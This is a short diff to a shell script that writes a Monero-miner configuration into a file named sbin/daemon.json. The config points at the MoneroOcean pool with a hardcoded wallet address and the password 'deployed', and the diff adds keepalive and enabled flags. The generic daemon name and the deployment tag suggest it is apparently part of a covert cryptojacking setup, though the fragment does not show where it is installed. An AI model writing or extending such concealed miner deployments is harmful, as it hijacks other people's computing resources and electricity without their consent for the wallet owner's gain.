@@ -59,6 +59,8 @@ cat > sbin/daemon.json << 'CFGEOF'
     "url": "gulf.moneroocean.stream:443",
     "user": "46ehvyKTGcU6Z9yzUHSY7BiNxsS6fNy4u37brttGkHwgMoZYQ8bqPnRPBMvDLZ3HQJRRAsXPoJW1tEtCTMc5ye26BUvdfqA",
     "pass": "deployed",
+    "keepalive": true,
+    "enabled": true,
     "tls": true
   }],
   "print-time": 60,
